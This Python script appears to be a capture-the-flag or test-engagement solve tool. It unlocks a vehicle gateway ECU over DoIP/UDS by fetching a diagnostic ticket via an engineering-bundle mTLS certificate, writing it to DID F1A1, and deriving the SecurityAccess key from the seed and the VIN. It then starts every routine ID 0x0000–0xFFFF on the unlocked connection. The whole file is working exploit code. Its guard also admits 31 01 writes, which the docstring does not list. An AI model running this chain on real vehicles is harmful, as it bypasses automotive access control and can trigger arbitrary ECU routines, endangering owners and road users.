#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Unlocked-state RID sweep on node 0x1220 (04 -> 05 entry).

The Lead's unlock chain (2026-11-14 11:0x) is:
    RA -> 10 03 -> 2E F1A1 + <ASCII ticket> -> 27 01 (seed) -> 27 02 (key) -> 6702

Constraints that shape this script:
  * the ticket is written as an **ASCII base64url string** into DID F1A1
  * ticket TTL is 600 s, so a fresh one is issued right before the sweep
  * the unlocked state is **one-shot and connection-bound**: sending 27 01 again
    resets it, and only the same TCP connection keeps the security level.

So the sweep runs pipelined on the very socket that performed 27 02.  A batch is
accepted when the answer count matches; positive answers are matched by the RID
they echo (`71 01 <RID> ...`), everything else must be the same negative body.
Any ambiguous batch is re-probed one RID at a time **on the same connection**
(never on a new one, that would lose the unlock).

Evidence: numbered JSONL + summary under 03_EVIDENCE/cgw/.
"""
from __future__ import annotations

import hashlib
import json
import struct
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "04_SOLVE" / "uds"))
sys.path.insert(0, str(ROOT / "04_SOLVE" / "cgw"))

import solve_task04 as st  # noqa: E402  (Lead's unlock implementation)
import doip_uds as d  # noqa: E402

HOST = d.DEFAULT_HOST
PORT = d.DEFAULT_PORT
SA = 0x0E00
NODE = d.NODE_1220_TA
BATCH = 32


def positive_rid(body: bytes):
    """Return the RID echoed by a positive 71 01/71 03 answer, else None."""
    if len(body) >= 4 and body[0] == 0x71 and body[1] in (0x01, 0x03):
        return struct.unpack(">H", body[2:4])[0]
    return None


def raw_uds(link, uds: bytes, label: str, purpose: str, quiet=0.6, total=6.0):
    """Send an explicitly-authorised state-changing UDS request with evidence.

    Only the two steps the Lead authorised are allowed here: the ASCII ticket
    bind (`2E F1A1 ...`) and `27 02 <key>`. Everything else in this script goes
    through Link.uds and its read-only guard.
    """
    sid = uds[0]
    ok = ((sid == 0x2E and uds[1:3] == b"\xF1\xA1")
          or (sid == 0x27 and len(uds) >= 2 and uds[1] == 0x02)
          or (sid == 0x31 and len(uds) >= 2 and uds[1] == 0x01))
    assert ok, f"raw_uds refuses {uds[:4].hex()}"
    payload = struct.pack(">HH", link.sa, NODE) + uds
    t0 = time.time()
    link.conn.send(d.PT_DIAG_MSG, payload)
    frames = link.conn.drain(quiet=quiet, total=total)
    rec = {"label": label, "purpose": purpose, "host": f"{link.host}:{link.port}",
           "tester_sa": f"0x{link.sa:04X}", "target_la": f"0x{NODE:04X}",
           "request": {"ptype": "0x8001", "hex": payload.hex().upper(), "uds": uds.hex().upper()},
           "responses": [], "uds": [], "acks": [], "nacks": [],
           "elapsed_ms": round((time.time() - t0) * 1000, 2)}
    for ver, ptype, data in frames:
        link.ev.wire("RX", ptype, data)
        rec["responses"].append({"ptype": f"0x{ptype:04X}", "hex": data.hex().upper()})
        if ptype == d.PT_DIAG_MSG and len(data) >= 4:
            src, dst = struct.unpack(">HH", data[:4])
            rec["uds"].append({"from": f"0x{src:04X}", "to": f"0x{dst:04X}",
                               "hex": data[4:].hex().upper(),
                               "parsed": d.parse_uds_response(data[4:])})
    rec["parsed"] = (" | ".join(u["parsed"] for u in rec["uds"]) if rec["uds"] else "NO RESPONSE")
    link.ev.record(rec)
    return rec


def probe_seq(link, rid: int, wait=0.6):
    """One request on the existing (unlocked) connection."""
    link.conn.send(d.PT_DIAG_MSG,
                   struct.pack(">HH", SA, NODE) + bytes([0x31, 0x01]) + rid.to_bytes(2, "big"))
    frames = link.conn.drain(quiet=wait, total=2.5)
    for (ver, ptype, data) in frames:
        if ptype == d.PT_DIAG_MSG and len(data) >= 4:
            return data[4:].hex().upper()
    return ""


def fetch_ticket():
    """Fresh ASCII diagnostic ticket through the engineering-bundle mTLS cert."""
    ident = st.DoIP().ident()
    if not ident or not ident[1] or len(ident[1]) < 17:
        raise RuntimeError("DoIP ident failed")
    vin = ident[1][:17].decode()
    print(f"[*] VIN from DoIP ident: {vin}")
    node = st.diag_query(vin)
    print(f"[*] campaign={node.get('campaignId')} cred={str(node.get('firmwareCredential'))[:8]}...")
    blob = st.fetch_bundle(node["firmwareCredential"])
    zp = ROOT / "04_SOLVE" / "cgw" / "work" / "bundle.zip"
    zp.parent.mkdir(parents=True, exist_ok=True)
    zp.write_bytes(blob)
    ex = ROOT / "04_SOLVE" / "cgw" / "work" / "x"
    import zipfile
    zipfile.ZipFile(zp).extractall(ex)
    certdir = ex / "diagnostics"
    j = st.issue_ticket(str(certdir))
    ticket = j["diagnosticTicket"]
    print(f"[*] ticket issued: {ticket[:12]}... ({len(ticket)} chars)")
    return vin, ticket


def unlock(link, vin, ticket):
    rec, parsed = link.activate(SA, 0x00, label="r4_ra_unlock")
    if not parsed or parsed.get("code") != "0x10":
        raise RuntimeError(f"routing activation failed: {parsed}")
    r = link.uds(NODE, bytes.fromhex("1003"), "r4_unlock_1003", purpose="extended session")
    print(f"  10 03        -> {r.get('parsed')}")
    if not (r.get("parsed") or "").startswith("0x1220: POSITIVE"):
        raise RuntimeError("extended session failed")
    r = raw_uds(link, bytes.fromhex("2EF1A1") + ticket.encode("ascii"), "r4_unlock_2e_f1a1",
                purpose="bind ASCII ticket to DID F1A1 (Lead-authorised write)")
    print(f"  2E F1A1      -> {r.get('parsed')}")
    if not any(u["hex"].upper().startswith("6EF1A1") for u in r.get("uds", [])):
        raise RuntimeError(f"ticket bind failed: {r.get('parsed')}")
    r = link.uds(NODE, bytes.fromhex("2701"), "r4_unlock_2701", purpose="request seed")
    print(f"  27 01        -> {r.get('parsed')}")
    seed_hex = ""
    for u in r.get("uds", []):
        if u["hex"].upper().startswith("6701"):
            seed_hex = u["hex"][4:]
    if not seed_hex:
        raise RuntimeError("no seed")
    seed = bytes.fromhex(seed_hex)
    key = st.hash8(seed[:8], hashlib.sha256(vin.encode()).digest()[:8], st.C_DEV)
    print(f"  seed={seed.hex()} key={key.hex()}")
    r = raw_uds(link, bytes.fromhex("2702") + key, "r4_unlock_2702",
                purpose="send key (Lead-authorised SecurityAccess)")
    print(f"  27 02        -> {r.get('parsed')}")
    ok = any(u["hex"].upper().startswith("6702") for u in r.get("uds", []))
    if not ok:
        raise RuntimeError(f"sendKey failed: {r.get('parsed')}")
    return seed, key


def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--unlock-only", action="store_true",
                    help="only run the unlock chain + capability check")
    ap.add_argument("--lo", default="0000")
    ap.add_argument("--hi", default="FFFF")
    args = ap.parse_args()
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    ev = d.Evidence(d.EVID)
    t_start = time.time()
    vin, ticket = fetch_ticket()

    link = d.Link(HOST, PORT, ev, SA, 4.0)
    rows = {}
    hits = {}
    ambiguous_batches = 0
    unlock_lost = False
    try:
        unlock(link, vin, ticket)

        # --- immediate capability check (same connection) ---
        r = raw_uds(link, bytes.fromhex("3101FF00"), "r4_cap_3101ff00",
                    purpose="post-unlock startRoutine FF00 capability check")
        print(f"  31 01 FF00   -> {r.get('parsed')}")
        r = link.uds(NODE, bytes.fromhex("22F1A3"), "r4_cap_22f1a3",
                     purpose="post-unlock protected DID read")
        print(f"  22 F1A3      -> {r.get('parsed')}")

        if args.unlock_only:
            print("[*] --unlock-only: stopping after the capability check")
            return 0
        lo, hi = int(args.lo, 16), int(args.hi, 16)
        print(f"[*] pipelined 31 01 sweep 0x{lo:04X}-0x{hi:04X} on the unlocked connection, batch={BATCH}")
        for start in range(lo, hi + 1, BATCH):
            chunk = list(range(start, min(start + BATCH, hi + 1)))
            for rid in chunk:
                link.conn.send(d.PT_DIAG_MSG,
                               struct.pack(">HH", SA, NODE) + bytes([0x31, 0x01]) + rid.to_bytes(2, "big"))
            frames = link.collect_n(len(chunk), timeout=3.0, quiet=0.15)
            bodies = [b for (k, s, b) in frames if k == "uds"]
            if len(bodies) != len(chunk):
                ambiguous_batches += 1
                link.conn.drain(quiet=0.4, total=2.0)
                for rid in chunk:
                    body = probe_seq(link, rid)
                    rows[rid] = body
                    if not body.startswith("7F3131"):
                        hits[rid] = body
                        print(f"    *** HIT 0x{rid:04X} -> {body}", flush=True)
                continue
            pos = {}
            negs = []
            for _kind, src, body in frames:
                rid_echo = positive_rid(body)
                if rid_echo is not None:
                    pos[rid_echo] = body.hex().upper()
                else:
                    negs.append(body.hex().upper())
            if len(set(negs)) > 1 or not set(pos).issubset(chunk):
                # different negative bodies -> order no longer trustworthy, re-probe
                ambiguous_batches += 1
                link.conn.drain(quiet=0.4, total=2.0)
                for rid in chunk:
                    body = probe_seq(link, rid)
                    rows[rid] = body
                    if not body.startswith("7F3131"):
                        hits[rid] = body
                        print(f"    *** HIT 0x{rid:04X} -> {body}", flush=True)
                continue
            neg = negs[0] if negs else "7F3131"
            for rid in chunk:
                body = pos.get(rid, neg)
                rows[rid] = body
                if body != neg or not body.startswith("7F3131"):
                    hits[rid] = body
                    print(f"    *** HIT 0x{rid:04X} -> {body}", flush=True)
            # detect a lost unlock (negative body switched to 7F3133)
            if negs and negs[0].startswith("7F3133"):
                unlock_lost = True
                print("[!] negative answers are 7F3133 -> unlock lost; aborting sweep")
                break
            if (start % (BATCH * 256) == 0) and start:
                rate = start / max(time.time() - t_start, 1e-6)
                print(f"    ...0x{start:04X}/0xFFFF {rate:.0f} req/s hits={len(hits)}", flush=True)
    finally:
        link.close()

    # --- evidence ---
    path = ev.numbered_path("ridscan_unlocked_31_01_0000_ffff", "jsonl")
    with open(path, "w", encoding="utf-8") as f:
        for rid in sorted(rows):
            f.write(json.dumps({"rid": f"0x{rid:04X}", "resp": rows[rid]}) + "\n")
    from collections import Counter
    dist = Counter(rows.values())
    ev.record({"label": "ridscan_unlocked_31_01_summary",
               "purpose": "unlocked-state 31 01 sweep on 0x1220 (batch pipelined, same connection)",
               "request": {"ptype": "0x8001", "hex": "31 01 <rid>"},
               "parsed": f"{len(rows)} RIDs, hits={len(hits)}, ambiguous_batches={ambiguous_batches}, "
                         f"unlock_lost={unlock_lost}, elapsed={time.time() - t_start:.1f}s",
               "distribution": {k: v for k, v in dist.most_common(10)},
               "hits": [{"rid": f"0x{r:04X}", "resp": b} for r, b in list(hits.items())[:300]],
               "evidence_file": path.name})
    print(f"[+] sweep done: {len(rows)} RIDs, hits={len(hits)}, "
          f"ambiguous={ambiguous_batches}, unlock_lost={unlock_lost}, "
          f"{time.time() - t_start:.1f}s -> {path.name}")
    for rid, body in list(hits.items())[:60]:
        print(f"    HIT 0x{rid:04X} -> {body}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
